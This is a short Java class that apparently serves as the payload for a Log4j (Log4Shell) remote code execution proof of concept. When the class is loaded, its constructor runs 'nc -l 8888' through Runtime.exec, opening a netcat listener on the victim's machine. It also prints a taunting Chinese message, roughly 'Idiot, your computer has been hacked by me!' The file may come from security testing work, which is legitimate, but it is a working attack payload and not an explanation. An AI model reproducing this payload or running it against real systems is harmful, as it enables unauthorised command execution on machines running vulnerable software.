package com.ksyun.safe.log4j;


import java.io.IOException;

public class DoingSomething {
    static {
        System.out.println("DoingSomething!!!!!!!");
    }
    public int id;
    public String password;
    public DoingSomething() {
        id = 1;
        password = "傻逼，你的电脑已经被我入侵！";
        System.out.println(id + ":" + password);
        Runtime runtime = Runtime.getRuntime();
        String[] cmd = new String[]{"nc","-l","8888"};
        System.out.println("？");
        System.out.println("我在你电脑上执行nc -l 8888");
        try {
            Process p = runtime.exec(cmd);
            p.waitFor();
        } catch (Exception e) {

        }
    }
}
